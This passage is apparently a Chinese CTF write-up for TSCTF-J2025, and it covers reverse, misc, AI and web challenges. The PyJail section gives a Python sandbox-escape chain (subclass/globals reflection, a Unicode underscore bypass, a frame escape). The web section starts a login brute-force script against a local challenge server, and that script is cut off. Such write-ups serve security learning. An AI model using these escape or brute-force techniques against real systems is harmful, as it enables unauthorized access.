<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">yindex = <span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> yindex &lt;= <span class=\"built_in\">len</span>(arc) +<span class=\"number\">1</span>:</span><br><span class=\"line\">    <span class=\"comment\"># XiaoYuan</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">Hotel</span>(<span class=\"params\">Lock</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> arc[Lock-<span class=\"number\">1</span>] != src[Lock-<span class=\"number\">2</span>]:</span><br><span class=\"line\">            exit(-<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(src) != <span class=\"built_in\">len</span>(arc)-<span class=\"number\">1</span>:</span><br><span class=\"line\">        exit(-<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        Hotel(yindex)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;FLAG:&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>.join(arc))</span><br></pre></td></tr></table></figure>\n\n<p>大致加密过程是：转序号、值加编号、前后异或、交换高低位</p>\n<p>所以给出解密代码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">src0 = [<span class=\"number\">211</span>, <span class=\"number\">71</span>, <span class=\"number\">210</span>, <span class=\"number\">132</span>, <span class=\"number\">193</span>, <span class=\"number\">114</span>, <span class=\"number\">244</span>, <span class=\"number\">208</span>, <span class=\"number\">213</span>, <span class=\"number\">99</span>, <span class=\"number\">37</span>, <span class=\"number\">214</span>, <span class=\"number\">224</span>, <span class=\"number\">101</span>, <span class=\"number\">98</span>, <span class=\"number\">212</span>, <span class=\"number\">224</span>, <span class=\"number\">118</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">src = [<span class=\"number\">114</span>]+[(v&gt;&gt;<span class=\"number\">4</span>)|((v&amp;<span class=\"number\">0xf</span>)&lt;&lt;<span class=\"number\">4</span>) <span class=\"keyword\">for</span> v <span class=\"keyword\">in</span> src0]</span><br><span class=\"line\"></span><br><span class=\"line\">dst = []</span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"built_in\">len</span>(src) &gt; <span class=\"number\">1</span>:</span><br><span class=\"line\">    num = src.pop()</span><br><span class=\"line\">    dst.append(num^src[-<span class=\"number\">1</span>])</span><br><span class=\"line\">dst = src + dst[::-<span class=\"number\">1</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">ori = [(c-i-<span class=\"number\">1</span>-<span class=\"number\">1</span>)%<span class=\"number\">255</span> <span class=\"keyword\">for</span> i, c <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(dst)]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">bytes</span>(ori))</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/image-65.png\" alt=\"alt text\">（p对应114）</p>\n<p><box>TSCTF-J{LET_M3_8E_W1TH_Y0U}</box></p>\n<h2 id=\"【附】JustReverse的代码（失败品）：\"><a href=\"#【附】JustReverse的代码（失败品）：\" class=\"headerlink\" title=\"【附】JustReverse的代码（失败品）：\"></a>【附】JustReverse的代码（失败品）：</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"></span><br><span class=\"line\">n = <span class=\"number\">58</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> torch</span><br><span class=\"line\"><span class=\"keyword\">import</span> torch.nn <span class=\"keyword\">as</span> nn</span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Net</span>(nn.Module):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(Net, <span class=\"variable language_\">self</span>).__init__()</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.linear = nn.Linear(n, n*n)</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.conv1=nn.Conv2d(<span class=\"number\">1</span>, <span class=\"number\">1</span>, (<span class=\"number\">2</span>, <span class=\"number\">2</span>), stride=<span class=\"number\">2</span>)</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.conv2=nn.Conv2d(<span class=\"number\">1</span>, <span class=\"number\">1</span>, (<span class=\"number\">1</span>, <span class=\"number\">1</span>), stride=<span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.conv3=nn.Conv2d(<span class=\"number\">1</span>, <span class=\"number\">1</span>, (<span class=\"number\">2</span>, <span class=\"number\">2</span>), stride=<span class=\"number\">1</span>, padding=<span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.relu=nn.ReLU()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">forward</span>(<span class=\"params\">self, x</span>):</span><br><span class=\"line\">        x = x.view(<span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>*n)</span><br><span class=\"line\">        x = <span class=\"variable language_\">self</span>.conv1(x)</span><br><span class=\"line\">        x = <span class=\"variable language_\">self</span>.relu(x)</span><br><span class=\"line\">        x = <span class=\"variable language_\">self</span>.conv2(x)</span><br><span class=\"line\">        x = x.view(n)</span><br><span class=\"line\">        x = <span class=\"variable language_\">self</span>.linear(x)</span><br><span class=\"line\">        x = x.view(<span class=\"number\">1</span>, <span class=\"number\">1</span>, n, n)</span><br><span class=\"line\">        x = <span class=\"variable language_\">self</span>.conv3(x)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> x</span><br><span class=\"line\"></span><br><span class=\"line\">mynet=Net()</span><br><span class=\"line\">mynet.load_state_dict(torch.load(<span class=\"string\">&#x27;model.pth&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">out = <span class=\"built_in\">list</span>(<span class=\"built_in\">map</span>(<span class=\"keyword\">lambda</span> line: <span class=\"built_in\">list</span>(<span class=\"built_in\">map</span>(<span class=\"built_in\">float</span>, line.split(<span class=\"string\">&#x27; &#x27;</span>))), <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;ciphertext.txt&#x27;</span>).readlines()))</span><br><span class=\"line\"></span><br><span class=\"line\">out = np.array(out)</span><br><span class=\"line\"></span><br><span class=\"line\">out -= mynet.conv3.bias.detach().numpy()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># print(out)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">reverse_conv</span>(<span class=\"params\">kernel, after, before_size</span>):</span><br><span class=\"line\">    last_line = [<span class=\"number\">0</span>] + [<span class=\"number\">0</span>] * before_size + [<span class=\"number\">0</span>]</span><br><span class=\"line\">    before = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(before_size):</span><br><span class=\"line\">        line = [<span class=\"number\">0</span>]</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(before_size):</span><br><span class=\"line\">            line.append((after[i][j] - kernel[<span class=\"number\">0</span>][<span class=\"number\">0</span>] * last_line[j] - kernel[<span class=\"number\">0</span>][<span class=\"number\">1</span>] * last_line[j+<span class=\"number\">1</span>] - kernel[<span class=\"number\">1</span>][<span class=\"number\">0</span>] * <span class=\"number\">0</span>)/kernel[<span class=\"number\">1</span>][<span class=\"number\">1</span>])</span><br><span class=\"line\">        last_line = line + [<span class=\"number\">0</span>]</span><br><span class=\"line\">        before.append(line[<span class=\"number\">1</span>:])</span><br><span class=\"line\">    <span class=\"keyword\">return</span> before</span><br><span class=\"line\"></span><br><span class=\"line\">outl = reverse_conv(mynet.conv3.weight.detach().numpy().reshape((<span class=\"number\">2</span>, <span class=\"number\">2</span>)).tolist(), out.tolist(), n)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># print(outl)</span></span><br><span class=\"line\"></span><br><span class=\"line\">lb = mynet.linear.bias.detach().numpy()</span><br><span class=\"line\">lw = mynet.linear.weight.detach().numpy()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># print(lb.shape)</span></span><br><span class=\"line\"><span class=\"comment\"># print(lw.shape)</span></span><br><span class=\"line\"></span><br><span class=\"line\">out2 = np.linalg.inv(lw.T @ lw) @ (lw.T @ (np.array(outl).reshape((-<span class=\"number\">1</span>)) - lb))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># print(out2)</span></span><br><span class=\"line\"></span><br><span class=\"line\">out1 = (out2 - mynet.conv2.bias.detach().numpy()) / mynet.conv2.weight.detach().numpy()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># print(out1)</span></span><br><span class=\"line\"></span><br><span class=\"line\">w1 = mynet.conv1.weight.detach().numpy()</span><br><span class=\"line\">b1 = mynet.conv1.bias.detach().numpy()</span><br><span class=\"line\"></span><br><span class=\"line\">ori = (out1 - b1).reshape((-<span class=\"number\">1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(ori)</span><br><span class=\"line\">ajust = [<span class=\"built_in\">round</span>(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> ori.tolist()]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(ajust)</span><br><span class=\"line\">b = <span class=\"built_in\">sum</span>([[i&amp;<span class=\"number\">1</span>, (i&amp;<span class=\"number\">2</span>)//<span class=\"number\">2</span>] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> ajust], []) + <span class=\"built_in\">sum</span>([[(i&amp;<span class=\"number\">4</span>)//<span class=\"number\">4</span>, (i&amp;<span class=\"number\">8</span>)//<span class=\"number\">8</span>] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> ajust], [])</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"built_in\">len</span>(b), <span class=\"number\">8</span>):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(<span class=\"string\">&#x27;&#x27;</span>.join(<span class=\"built_in\">map</span>(<span class=\"built_in\">str</span>, b[i:i+<span class=\"number\">8</span>])), base=<span class=\"number\">2</span>)), end=<span class=\"string\">&#x27;&#x27;</span>, flush=<span class=\"literal\">True</span>)</span><br></pre></td></tr></table></figure>\n\n<script>\n  // 修复图炸的情况\n  (new Array(...document.getElementsByTagName('img'))).forEach(\n      img=>{\n          if(img.src.split('/')[3]!='images'&&!img.src.startsWith(location.href.split(\"#\")[0])){\n              console.log(`\"${decodeURI(img.src.split('/').slice(-1))}\" 貌似炸了`)\n              img.src=img.src.split('/').slice(-1)\n          }\n  })\n</script>","excerpt":"","more":"<p>由于是用Word写的啦，还要转成markdown才能传上来，下面给出PDF版本的WP链接</p>\n<p><a href=\"%E5%9C%86%E5%91%A8%E7%8E%87WP.pdf\">TSCTF-J2025 WP</a></p>\n<p>下面的内容与上面一致，但由于转换时的疏忽，可能会：多反斜杠&#x2F;少反斜杠&#x2F;多出莫名其妙的星号&#x2F;多出莫名其妙的换行，请谅解！</p>\n<p>最近会抽空对TSCTF-J2025进行复盘，敬请期待~</p>\n<blockquote>\n<p>不知道为什么图片路径可能会炸掉，在最后面写了一个简易的修复代码，不能保证一定有用</p>\n<p>如果图炸了的话请手动拼接URL，为</p>\n<p><span id=\"urlNow\"></span>image-编号.png</p>\n</blockquote>\n<script>\n  document.getElementById(\"urlNow\").innerText = location.href.split('#')[0]\n  document.getElementById(\"urlNow\").innerText += location.href.split('#')[0].slice(-1)==='/'?'':'/'\n</script>\n\n<h2 id=\"Abstract\"><a href=\"#Abstract\" class=\"headerlink\" title=\"Abstract\"></a>Abstract</h2><h3 id=\"ab-The-Great\"><a href=\"#ab-The-Great\" class=\"headerlink\" title=\"[ab] The Great\"></a>[ab] The Great</h3><p><img src=\"/image.png\" alt=\"alt text\"></p>\n<div>\n<img src=\"image-1.png\" style=\"float:right; zoom:0.7\">\n\n<p>这题一开始也是没有思路的，后来放了很多提示，决定好好想一想。</p>\n<p>首先看到提示2，要我们写出音名：</p>\n</div>\n\n<p><img src=\"/image-2.png\" alt=\"alt text\"></p>\n<p>然后add（+）是一个很重要的提示，如果把ABCD……映射为1234……，那么音符就可以相加了，以第二个音为例：</p>\n<p>$$F_{6} + C_{3} &#x3D; I_{9}$$</p>\n<p>由此，我们可以得出两个单词：EINSTEIN EQUATION，再结合提示1，应当以Latex形式写出爱因斯坦方程，故flag为</p>\n<style>\n  box {\n    border: 1px solid;\n    padding: 2px;\n    font-weight: bold;\n  }\n</style>\n\n<p><box>TSCTF-J{E&#x3D;mc^2}</box></p>\n<h2 id=\"Misc\"><a href=\"#Misc\" class=\"headerlink\" title=\"Misc\"></a>Misc</h2><h3 id=\"misc-Meow\"><a href=\"#misc-Meow\" class=\"headerlink\" title=\"[misc] Meow\"></a>[misc] Meow</h3><p>这题一开始没思路，后面做了几题才回来的，因为一眼丁真看到了”vfnd”（”TSC”的base64是”VFND”）</p>\n<p><img src=\"/image-3.png\" alt=\"alt text\"></p>\n<p>虽然全是Meow，但是根据程序格式，可以猜出：</p>\n<p><img src=\"/image-4.png\" alt=\"alt text\"></p>\n<p>所以最后输出的是：</p>\n<p><img src=\"/image-5.png\" alt=\"alt text\"></p>\n<p>结合vfnd，猜测这是大小写反转的base64，进行解码</p>\n<p><img src=\"/image-6.png\" alt=\"alt text\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">In [1]: import base64</span><br><span class=\"line\"></span><br><span class=\"line\">In [2]: t = &#x27;vfndveyTsNSkmv9bBq==xZrFq2fux01LB3Dnztb3iseHFq==&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">In [3]: import string</span><br><span class=\"line\"></span><br><span class=\"line\">In [4]: t = t.translate(str.maketrans(string.ascii_uppercase+string.ascii_lowercase, string.ascii_lowercase+string.ascii_uppercase))</span><br><span class=\"line\"></span><br><span class=\"line\">In [5]: base64.b64decode(t)</span><br><span class=\"line\"></span><br><span class=\"line\">Out[5]: b&#x27;TSCTF-J&#123;\\n1_Am&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">In [6]: base64.b64decode(t.split(&#x27;==&#x27;, 1)[1])</span><br><span class=\"line\"></span><br><span class=\"line\">Out[6]: b&#x27;_4_CaT_MeowMe0w!!!&#125;&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>最后把换行符去掉，就得到了flag</p>\n<p><box>TSCTF-J{1_Am_4_CaT_MeowMe0w!!!}</box></p>\n<h3 id=\"misc-卢森堡的秘密\"><a href=\"#misc-卢森堡的秘密\" class=\"headerlink\" title=\"[misc] 卢森堡的秘密\"></a>[misc] 卢森堡的秘密</h3><p>拿到zip和png，先进行binwalk和pngcheck，没有发现异常，考虑LSB，找到一个在线网站：<a href=\"https://georgeom.net/StegOnline/upload\">https://georgeom.net/StegOnline/upload</a></p>\n<p><img src=\"/image-7.png\" alt=\"alt text\"></p>\n<p>找到flag</p>\n<p><box>TSCTF-J{Th3_sEcre7_0f_L$B!}</box></p>\n<h3 id=\"misc-BadFile\"><a href=\"#misc-BadFile\" class=\"headerlink\" title=\"[misc] BadFile\"></a>[misc] BadFile</h3><p>先强烈推荐一个Windows开源软件<a href=\"https://github.com/QL-Win/QuickLook\">https://github.com/QL-Win/QuickLook</a>，把苹果的QuickLook功能在Windows上复刻了，特别方便！按空格后还可以按上下键翻动</p>\n<p>先看txt</p>\n<p>经过翻找，发现好像几段泄露文本都有数字？那就启动grep</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">grep -r -P <span class=\"string\">&#x27;\\d&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/image-8.png\" alt=\"alt text\"></p>\n<p>完美！</p>\n<p>下面看wav</p>\n<p>经过翻找，发现几段泄露音频都比较长，于是通过时长降序排列，发现前四都是</p>\n<p><img src=\"/image-9.png\" alt=\"alt text\"></p>\n<p>那……还有一段呢？只好慢慢翻了</p>\n<p>翻了好久终于找到了！居然只有1秒？？</p>\n<p><img src=\"/image-10.png\" alt=\"alt text\"></p>\n<p>“我的家在北京市朝阳区”……懂了，马上去线下真实你🤬</p>\n<p>最后是pdf</p>\n<p>经过翻找，发现恶意文件会弹窗，由于没有想到好的方法，一一查找</p>\n<p><img src=\"/image-11.png\" alt=\"alt text\"></p>\n<p>最后合成flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">In [1]: pdf = list(sorted(&#x27;&#x27;&#x27;8YmxZRca.pdf</span><br><span class=\"line\">...: mFU1SdVp.pdf</span><br><span class=\"line\">...: w9V1ZDEd.pdf</span><br><span class=\"line\">...: xdBqKtxe.pdf</span><br><span class=\"line\">...: Z8P4DHre.pdf&#x27;&#x27;&#x27;.split(&#x27;\\n&#x27;)))</span><br><span class=\"line\"></span><br><span class=\"line\">In [2]: txt = list(sorted(&#x27;&#x27;&#x27;3WQlwSaj.txt</span><br><span class=\"line\">...: dubZ3AZn.txt</span><br><span class=\"line\">...: nhlbNxGL.txt</span><br><span class=\"line\">...: qtFyaGkZ.txt</span><br><span class=\"line\">...: wlBUCOeg.txt&#x27;&#x27;&#x27;.split(&#x27;\\n&#x27;)))</span><br><span class=\"line\"></span><br><span class=\"line\">In [3]: wav = list(sorted(&#x27;&#x27;&#x27;2JuiKL42.wav</span><br><span class=\"line\">...: 4UjLqeRF.wav</span><br><span class=\"line\">...: Ew24ldS2.wav</span><br><span class=\"line\">...: HjRtD6f3.wav</span><br><span class=\"line\">...: RtUwEgj1.wav&#x27;&#x27;&#x27;.split(&#x27;\\n&#x27;)))</span><br><span class=\"line\"></span><br><span class=\"line\">In [4]: &#x27;_&#x27;.join([&#x27;_&#x27;.join(l) for l in [txt, wav, pdf]])</span><br><span class=\"line\"></span><br><span class=\"line\">Out[4]:</span><br><span class=\"line\">&#x27;3WQlwSaj.txt_dubZ3AZn.txt_nhlbNxGL.txt_qtFyaGkZ.txt_wlBUCOeg.txt_2JuiKL42.wav_4UjLqeRF.wav_Ew24ldS2.wav_HjRtD6f3.wav_RtUwEgj1.wav_8YmxZRca.pdf_Z8P4DHre.pdf_mFU1SdVp.pdf_w9V1ZDEd.pdf_xdBqKtxe.pdf&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">In [5]: import hashlib</span><br><span class=\"line\"></span><br><span class=\"line\">In [6]: hashlib.md5(_.encode()).hexdigest()</span><br><span class=\"line\"></span><br><span class=\"line\">Out[6]: &#x27;0b4a2a6431f6b94b3c1d3d50d0a45aea&#x27;</span><br></pre></td></tr></table></figure>\n\n<p><box>TSCTF-J{0b4a2a6431f6b94b3c1d3d50d0a45aea}</box></p>\n<h3 id=\"misc-PyJail\" style=\"opacity:0.6;\">[misc] PyJail （半成品）</h3>\n\n<p>拿到代码，发现globals受限，AST不允许访问”__“开头的属性。</p>\n<p>一开始打算用反射获得完整环境：（这里157是os._wrap_close的index，以实际情况为准）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27;&#x27;</span>.__class__.__mro__[<span class=\"number\">1</span>].__subclasses__()[<span class=\"number\">157</span>].__init__.__globals__</span><br></pre></td></tr></table></figure>\n\n<p>那么就需要绕过”__“，使用Unicode绕过</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27;&#x27;</span>._＿class__._＿mro__[<span class=\"number\">1</span>]._＿subclasses__()[<span class=\"number\">157</span>]._＿init__._＿globals__</span><br></pre></td></tr></table></figure>\n<p><img src=\"/image-12.png\" alt=\"alt text\"></p>\n<p>但是此举触发了import钩子，失败，接下来考虑栈帧逃逸</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">print</span>(g:=[*(q:=(q.gi_frame.f_back.f_back.f_globals <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> [<span class=\"number\">1</span>]))][<span class=\"number\">0</span>])</span><br></pre></td></tr></table></figure>\n\n<p>成功获得globals，但是接下来就没有思路了：</p>\n<ul>\n<li><p>os.system&#x2F;popen、subprocess都被ban了</p>\n</li>\n<li><p>_posixsubprocess不在sys.modules里，也无法被__loader__加载</p>\n</li>\n<li><p>写WP的时候突然想到会不会在环境变量里，确认了一下，也没有</p>\n</li>\n</ul>\n<p><img src=\"/image-13.png\" alt=\"alt text\"></p>\n<p><box style=\"opacity: 0.6;\">PLACEHOLDER{TA5K_F4ILED}</box></p>\n<h2 id=\"AI\"><a href=\"#AI\" class=\"headerlink\" title=\"AI\"></a>AI</h2><h3 id=\"ai-Coup\"><a href=\"#ai-Coup\" class=\"headerlink\" title=\"[ai] Coup\"></a>[ai] Coup</h3><p>拿到题目还不知道是干什么的，看AI玩了一局才明白：我们要给代表我们的AI玩家写prompt，来指导它赢得比赛，下面给出我的提示词：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">You are a good Coup Game Player, your aim is to earn a lot money then to</span><br><span class=\"line\">coup the other player to death while keep you alive</span><br></pre></td></tr></table></figure>\n\n<p>经过测试，一遍拿到flag，但是仍有改进的余地，AI明显把赚钱放在了第一位，只有到10+才会被迫coup别人，可以强调一下两个任务的优先级。</p>\n<p>flag是什么来着？不记得了！😰</p>\n<p><box style=\"opacity:0.6;\">PLACEHOLDER{I_forg0t_mY_fl@g}</box></p>\n<h3 id=\"ai-JustReverse\" style=\"opacity: 0.6;\">[ai] JustReverse （失败）</h3>\n\n<p>根据给出的模型和参数，进行反向求解，但是哪里似乎写错了&#x2F;不够精确，没有求出flag，代码附在最后。</p>\n<p><img src=\"/image-14.png\" alt=\"alt text\"></p>\n<p>（你总不能跟我讲这个就是flag吧）</p>\n<p><box style=\"opacity: 0.6;\">PLACEHOLDER{T4SK_FA1L3D}</box></p>\n<h2 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h2><h3 id=\"web-EZ-Login（签到）\"><a href=\"#web-EZ-Login（签到）\" class=\"headerlink\" title=\"[web] EZ_Login（签到）\"></a>[web] EZ_Login（签到）</h3><p>一个登录界面，先尝试SQL注入，发现貌似没有注入点。</p>\n<p>下面采取爆破，因为有验证码，但好像只要有某一次的session就提交对应的验证码就好了，下面的脚本还是模拟了登录全流程，并且加了连接中断的处理</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">crack</span>(<span class=\"params\">pwd</span>):</span><br><span class=\"line\"></span><br><span class=\"line\">    s = requests.Session()</span><br><span class=\"line\"></span><br><span class=\"line\">    cookies = &#123;</span><br><span class=\"line\">        <span class=\"comment\"># 省略</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    headers = &#123;</span><br><span class=\"line\">        <span class=\"comment\"># 省略</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    response = s.get(<span class=\"string\">&#x27;http://127.0.0.1:54655/login&#x27;</span>, cookies=cookies, headers=headers)</span><br><span class=\"line\"></span><br><span class=\"line\">    data = &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;username&#x27;</span>: <span class=\"string\">&#x27;admin&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;password&#x27;</span>: pwd,</span><br><span class=\"line\">        <span 